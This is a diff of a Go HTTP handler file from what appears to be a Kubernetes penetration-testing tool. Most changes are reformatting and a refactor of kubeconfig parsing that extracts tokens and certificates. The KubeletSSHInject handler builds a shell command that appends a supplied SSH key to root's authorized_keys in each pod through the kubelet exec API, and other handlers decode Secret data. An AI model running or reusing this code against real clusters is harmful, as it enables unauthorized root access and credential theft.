@@ -5,11 +5,12 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	"regexp"
+	neturl "net/url"
 	"strings"
 
 	"github.com/gin-gonic/gin"
 	"github.com/trymonoly/K8sPenTool-ng/internal/util"
+	"k8s.io/client-go/tools/clientcmd"
 )
 
 type AccessHandler struct {
@@ -20,10 +21,10 @@ func NewAccessHandler() *AccessHandler {
 }
 
 type accessRequest struct {
-	TargetHost  string `json:"target_host" binding:"required"`
-	Token       string `json:"token"`
-	TimeoutSec  int    `json:"timeout_sec"`
-	SkipTLS     bool   `json:"skip_tls"`
+	TargetHost string `json:"target_host" binding:"required"`
+	Token      string `json:"token"`
+	TimeoutSec int    `json:"timeout_sec"`
+	SkipTLS    bool   `json:"skip_tls"`
 }
 
 // APIServer
@@ -60,7 +61,9 @@ func (h *AccessHandler) CheckAPIServer(c *gin.Context) {
 				typ, _ := obj["type"].(string)
 				decoded := make(map[string]string)
 				for k, v := range data {
-					if s, ok := v.(string); ok { decoded[k] = s }
+					if s, ok := v.(string); ok {
+						decoded[k] = s
+					}
 				}
 				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
 			}
@@ -87,14 +90,14 @@ func (h *AccessHandler) CheckInsecurePort(c *gin.Context) {
 
 func (h *AccessHandler) SendCustomRequest(c *gin.Context) {
 	var req struct {
-		TargetHost string `json:"target_host" binding:"required"`
-		Path       string `json:"path" binding:"required"`
-		Method     string `json:"method"`
-		Token      string `json:"token"`
-		Body       string `json:"body"`
+		TargetHost  string `json:"target_host" binding:"required"`
+		Path        string `json:"path" binding:"required"`
+		Method      string `json:"method"`
+		Token       string `json:"token"`
+		Body        string `json:"body"`
 		ContentType string `json:"content_type"`
-		TimeoutSec int    `json:"timeout_sec"`
-		SkipTLS    bool   `json:"skip_tls"`
+		TimeoutSec  int    `json:"timeout_sec"`
+		SkipTLS     bool   `json:"skip_tls"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -114,33 +117,38 @@ func (h *AccessHandler) SendCustomRequest(c *gin.Context) {
 			return
 		}
 		// inline parse K8s API response
-	var parsed map[string]interface{}
-	parsedKey, parsedItems := "", []gin.H(nil)
-	if err := json.Unmarshal(body, &parsed); err == nil {
-		if rawItems, ok := parsed["items"].([]interface{}); ok && len(rawItems) > 0 {
-			// kind is at top level (e.g. "SecretList"), not in items
-			listKind, _ := parsed["kind"].(string)
-			kind := strings.TrimSuffix(listKind, "List")
-			parsedItems = make([]gin.H, 0, len(rawItems))
-			for _, ri := range rawItems {
-				obj, _ := ri.(map[string]interface{})
-				meta, _ := obj["metadata"].(map[string]interface{})
-				data, _ := obj["data"].(map[string]interface{})
-				name, _ := meta["name"].(string)
-				ns, _ := meta["namespace"].(string)
-				typ, _ := obj["type"].(string)
-				decoded := make(map[string]string)
-				for k, v := range data {
-					if s, ok := v.(string); ok { decoded[k] = s }
+		var parsed map[string]interface{}
+		parsedKey, parsedItems := "", []gin.H(nil)
+		if err := json.Unmarshal(body, &parsed); err == nil {
+			if rawItems, ok := parsed["items"].([]interface{}); ok && len(rawItems) > 0 {
+				// kind is at top level (e.g. "SecretList"), not in items
+				listKind, _ := parsed["kind"].(string)
+				kind := strings.TrimSuffix(listKind, "List")
+				parsedItems = make([]gin.H, 0, len(rawItems))
+				for _, ri := range rawItems {
+					obj, _ := ri.(map[string]interface{})
+					meta, _ := obj["metadata"].(map[string]interface{})
+					data, _ := obj["data"].(map[string]interface{})
+					name, _ := meta["name"].(string)
+					ns, _ := meta["namespace"].(string)
+					typ, _ := obj["type"].(string)
+					decoded := make(map[string]string)
+					for k, v := range data {
+						if s, ok := v.(string); ok {
+							decoded[k] = s
+						}
+					}
+					parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
 				}
-				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
+				parsedKey = strings.ToLower(kind) + "s"
 			}
-			parsedKey = strings.ToLower(kind) + "s"
 		}
-	}
-	resp := gin.H{"status_code": code, "body": util.FormatResponse(code, body)}
-	if parsedKey != "" { resp[parsedKey] = parsedItems; resp["total"] = len(parsedItems) }
-	c.JSON(http.StatusOK, resp)
+		resp := gin.H{"status_code": code, "body": util.FormatResponse(code, body)}
+		if parsedKey != "" {
+			resp[parsedKey] = parsedItems
+			resp["total"] = len(parsedItems)
+		}
+		c.JSON(http.StatusOK, resp)
 		return
 	}
 	code, body, err := util.SendRequest(url, req.Method, req.Token, req.TimeoutSec, req.SkipTLS)
@@ -165,7 +173,9 @@ func (h *AccessHandler) SendCustomRequest(c *gin.Context) {
 				typ, _ := obj["type"].(string)
 				decoded := make(map[string]string)
 				for k, v := range data {
-					if s, ok := v.(string); ok { decoded[k] = s }
+					if s, ok := v.(string); ok {
+						decoded[k] = s
+					}
 				}
 				parsedItems = append(parsedItems, gin.H{"namespace": ns, "name": name, "type": typ, "keys": len(data), "decoded_keys": decoded})
 			}
@@ -173,7 +183,10 @@ func (h *AccessHandler) SendCustomRequest(c *gin.Context) {
 		}
 	}
 	resp := gin.H{"status_code": code, "body": util.FormatResponse(code, body)}
-	if parsedKey != "" { resp[parsedKey] = parsedItems; resp["total"] = len(parsedItems) }
+	if parsedKey != "" {
+		resp[parsedKey] = parsedItems
+		resp["total"] = len(parsedItems)
+	}
 	c.JSON(http.StatusOK, resp)
 }
 
@@ -343,83 +356,73 @@ func (h *AccessHandler) ParseKubeconfig(c *gin.Context) {
 		return
 	}
 
-	content := req.Content
-	servers := []string{}
-	users := []string{}
-	clusters := []string{}
-	contexts := []string{}
-	currentContext := ""
-
-	serverRe := regexp.MustCompile(`server:\s*(.+)`)
-	userRe := regexp.MustCompile(`- name:\s*(.+)`)
-	clusterRe := regexp.MustCompile(`cluster:\s*(.+)`)
-	contextRe := regexp.MustCompile(`name:\s*(.+)`)
-	tokenRe := regexp.MustCompile(`token:\s*(.+)`)
-	certRe := regexp.MustCompile(`client-certificate-data:\s*(.+)`)
-
-	for _, match := range serverRe.FindAllStringSubmatch(content, -1) {
-		servers = append(servers, strings.TrimSpace(match[1]))
-	}
-
-	inUsers := false
-	inClusters := false
-	scanner := strings.Split(content, "\n")
-	for _, line := range scanner {
-		trimmed := strings.TrimSpace(line)
-		if strings.Contains(trimmed, "users:") {
-			inUsers = true
-			inClusters = false
-			continue
-		}
-		if strings.Contains(trimmed, "clusters:") {
-			inClusters = true
-			inUsers = false
-			continue
-		}
-		if strings.HasPrefix(trimmed, "contexts:") || strings.HasPrefix(trimmed, "current-context:") {
-			inUsers = false
-			inClusters = false
-			if m := contextRe.FindStringSubmatch(trimmed); len(m) > 1 {
-				contexts = append(contexts, strings.TrimSpace(m[1]))
-			}
-			continue
-		}
-		if inUsers && strings.HasPrefix(trimmed, "- name:") {
-			if m := userRe.FindStringSubmatch(trimmed); len(m) > 1 {
-				users = append(users, strings.TrimSpace(m[1]))
-			}
-		}
-		if inClusters && strings.HasPrefix(trimmed, "- name:") {
-			if m := clusterRe.FindStringSubmatch(trimmed); len(m) > 1 {
-				clusters = append(clusters, strings.TrimSpace(m[1]))
-			}
-		}
-	}
-
-	tokens := []string{}
-	for _, m := range tokenRe.FindAllStringSubmatch(content, -1) {
-		tokens = append(tokens, strings.TrimSpace(m[1]))
-	}
-	certs := []string{}
-	for _, m := range certRe.FindAllStringSubmatch(content, -1) {
-		certs = append(certs, m[1][:min(40, len(m[1]))]+"...")
-	}
-
-	ccRe := regexp.MustCompile(`current-context:\s*(.+)`)
-	if m := ccRe.FindStringSubmatch(content); len(m) > 1 {
-		currentContext = strings.TrimSpace(m[1])
+	parsed, err := parseKubeconfigContent(req.Content)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		return
 	}
 
 	c.JSON(http.StatusOK, gin.H{
 		"status":          "parsed",
-		"servers":         servers,
-		"users":           users,
-		"clusters":        clusters,
-		"contexts":        contexts,
-		"current_context": currentContext,
-		"tokens_found":    tokens,
-		"certs_found":     certs,
+		"servers":         parsed.Servers,
+		"users":           parsed.Users,
+		"clusters":        parsed.Clusters,
+		"contexts":        parsed.Contexts,
+		"current_context": parsed.CurrentContext,
+		"tokens_found":    parsed.TokensFound,
+		"certs_found":     parsed.CertsFound,
 	})
+}
+
+type kubeconfigParseResult struct {
+	Servers        []string
+	Users          []string
+	Clusters       []string
+	Contexts       []string
+	CurrentContext string
+	TokensFound    []string
+	CertsFound     []string
+}
+
+func parseKubeconfigContent(content string) (*kubeconfigParseResult, error) {
+	cfg, err := clientcmd.Load([]byte(content))
+	if err != nil {
+		return nil, fmt.Errorf("parse kubeconfig: %w", err)
+	}
+
+	result := &kubeconfigParseResult{
+		Servers:        make([]string, 0, len(cfg.Clusters)),
+		Users:          make([]string, 0, len(cfg.AuthInfos)),
+		Clusters:       make([]string, 0, len(cfg.Clusters)),
+		Contexts:       make([]string, 0, len(cfg.Contexts)),
+		CurrentContext: cfg.CurrentContext,
+		TokensFound:    make([]string, 0, len(cfg.AuthInfos)),
+		CertsFound:     make([]string, 0, len(cfg.AuthInfos)),
+	}
+
+	for name, cluster := range cfg.Clusters {
+		result.Clusters = append(result.Clusters, name)
+		if cluster.Server != "" {
+			result.Servers = append(result.Servers, cluster.Server)
+		}
+	}
+	for name, authInfo := range cfg.AuthInfos {
+		result.Users = append(result.Users, name)
+		if authInfo.Token != "" {
+			result.TokensFound = append(result.TokensFound, authInfo.Token)
+		}
+		if len(authInfo.ClientCertificateData) > 0 {
+			preview := string(authInfo.ClientCertificateData)
+			result.CertsFound = append(result.CertsFound, preview[:min(40, len(preview))]+"...")
+		} else if authInfo.ClientCertificate != "" {
+			result.CertsFound = append(result.CertsFound, authInfo.ClientCertificate)
+		}
+	}
+	for name := range cfg.Contexts {
+		result.Contexts = append(result.Contexts, name)
+	}
+
+	return result, nil
 }
 
 // Etcd v3 support
@@ -545,7 +548,8 @@ func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
 
 			sshCmd := fmt.Sprintf("mkdir -p /root/.ssh 2>/dev/null && echo '%s' >> /root/.ssh/authorized_keys 2>/dev/null && chmod 600 /root/.ssh/authorized_keys 2>/dev/null && echo 'SSH_KEY_INJECTED' || echo 'FAILED'",
 				req.SSHKey)
-			ec, eb, execErr := util.SendPost(execUrl, "cmd="+sshCmd, "application/x-www-form-urlencoded", "", req.TimeoutSec, req.SkipTLS)
+			form := neturl.Values{"cmd": []string{sshCmd}}
+			ec, eb, execErr := util.SendPost(execUrl, form.Encode(), "application/x-www-form-urlencoded", "", req.TimeoutSec, req.SkipTLS)
 
 			result := gin.H{
 				"namespace": ns,
@@ -570,7 +574,7 @@ func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
 	sshCmd := fmt.Sprintf("ssh -i ~/.ssh/id_rsa root@%s", req.TargetHost)
 	c.JSON(http.StatusOK, gin.H{
 		"results":        results,
-		"pods_attempted":  len(results),
+		"pods_attempted": len(results),
 		"ssh_command":    sshCmd,
 		"note":           fmt.Sprintf("SSH key injected into %d containers. Connect: %s", len(results), sshCmd),
 	})
@@ -635,8 +639,12 @@ func tryParseItems(body []byte) (string, []gin.H) {
 			if contList, ok := spec["containers"].([]interface{}); ok {
 				for _, c := range contList {
 					cm, _ := c.(map[string]interface{})
-					if cn, _ := cm["name"].(string); cn != "" { containers = append(containers, cn) }
-					if im, _ := cm["image"].(string); im != "" { images = append(images, im) }
+					if cn, _ := cm["name"].(string); cn != "" {
+						containers = append(containers, cn)
+					}
+					if im, _ := cm["image"].(string); im != "" {
+						images = append(images, im)
+					}
 				}
 			}
 			result = append(result, gin.H{"namespace": ns, "name": name, "status": phase, "node": nodeName, "ip": podIP, "containers": strings.Join(containers, ", "), "images": strings.Join(images, ", ")})
@@ -658,7 +666,9 @@ func tryParseItems(body []byte) (string, []gin.H) {
 					proto, _ := pm["protocol"].(string)
 					nodePort, _ := pm["nodePort"].(float64)
 					ps := fmt.Sprintf("%.0f/%s", port, proto)
-					if nodePort > 0 { ps += fmt.Sprintf("→%.0f", nodePort) }
+					if nodePort > 0 {
+						ps += fmt.Sprintf("→%.0f", nodePort)
+					}
 					ports = append(ports, ps)
 				}
 			}
@@ -684,7 +694,9 @@ func tryParseItems(body []byte) (string, []gin.H) {
 				for _, c := range conds {
 					cm, _ := c.(map[string]interface{})
 					if t, _ := cm["type"].(string); t == "Ready" {
-						if s, _ := cm["status"].(string); s == "True" { ready = "Ready" }
+						if s, _ := cm["status"].(string); s == "True" {
+							ready = "Ready"
+						}
 					}
 				}
 			}
@@ -704,9 +716,9 @@ func tryParseItems(body []byte) (string, []gin.H) {
 			_ = status["phase"] // phase available for future use
 			result = append(result, gin.H{"namespace": "", "name": name, "type": "Namespace", "cluster_ip": "", "ports": []string{}})
 		}
-		default:
-			return "", nil
-		}
-		key := strings.ToLower(kind) + "s"
-		return key, result
+	default:
+		return "", nil
 	}
+	key := strings.ToLower(kind) + "s"
+	return key, result
+}
